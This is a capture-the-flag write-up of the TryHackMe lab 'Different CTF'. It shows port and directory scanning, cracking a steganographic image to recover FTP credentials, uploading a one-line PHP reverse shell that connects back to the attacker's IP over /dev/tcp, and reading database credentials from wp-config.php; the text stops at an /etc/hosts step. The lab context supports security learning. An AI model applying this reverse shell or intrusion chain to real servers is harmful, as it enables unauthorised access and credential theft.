# Different CTF — Writeup

## Overview
### Different CTF — Writeup
### Different CTF — Writeup
----
interesting room, you can shoot the sun
----
![](https://i.imgur.com/KoKRoAE.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/d4f7722b23452cbec5416193f4b55aa6.jpeg)
Start Machine
`MACHINE_IP`
﻿Hello there
We will tend to think differently in this room.
In fact, we will understand that what we see is not what we think, and if you go beyond the purpose, you will disappear in the room, fall into a rabbit hole.﻿
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.27.15 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.27.15:21
Open 10.10.27.15:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.27.15 [2 ports]
Discovered open port 21/tcp on 10.10.27.15
Discovered open port 80/tcp on 10.10.27.15
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.27.15
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.27.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.27.15
Host is up, received user-set (0.18s latency).

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: Hello World &#8211; Just another WordPress site
|_http-generator: WordPress 5.6
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.53 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.27.15 -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.27.15/_23-07-19_19-10-10.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-19_19-10-10.log

Target: http://10.10.27.15/

[19:10:11] Starting: 
[19:10:16] 301 -  318B  - /announcements  ->  http://10.10.27.15/announcements/
[19:10:30] 301 -    0B  - /index.php  ->  http://10.10.27.15/
[19:10:31] 301 -  315B  - /javascript  ->  http://10.10.27.15/javascript/
[19:10:40] 301 -  315B  - /phpmyadmin  ->  http://10.10.27.15/phpmyadmin/
[19:10:57] 301 -  313B  - /wp-admin  ->  http://10.10.27.15/wp-admin/
[19:10:57] 301 -  316B  - /wp-includes  ->  http://10.10.27.15/wp-includes/
[19:10:57] 301 -  315B  - /wp-content  ->  http://10.10.27.15/wp-content/
```
How many ports are open ?
*2*
What is the name of the secret directory ?
*/announcements*
### Task 2  Localhost
This place will be solved from inside after receiving a shell
Answer the questions below

## Exploitation
```text
download the 2 files
┌──(witty㉿kali)-[~]
└─$ stegseek austrailian-bulldog-ant.jpg /home/witty/Downloads/wordlist.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".

┌──(witty㉿kali)-[~]
└─$ cat austrailian-bulldog-ant.jpg.out 
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
                                                                                    
┌──(witty㉿kali)-[~]
└─$ echo "RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=" | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack 

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.27.15  
Connected to 10.10.27.15.
220 (vsFTPd 3.0.3)
Name (10.10.27.15:witty): hakanftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||45100|)
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.

ftp> put revshell.php
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||54405|)
150 Ok to send data.
100% |*************************************************|    74        1.03 MiB/s    00:00 ETA
226 Transfer complete.
74 bytes sent in 00:00 (0.19 KiB/s)

┌──(witty㉿kali)-[~]
└─$ cat revshell.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'");?>

http://10.10.27.15/revshell.php

not found maybe aanother subdomain

ftp> more wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

http://10.10.27.15/phpmyadmin login

phpmyadmin1 -> wp_options -> site_url was a subdomain

http://subdomain.adana.thm

┌──(witty㉿kali)-[~]
└─$ tac /etc/hosts
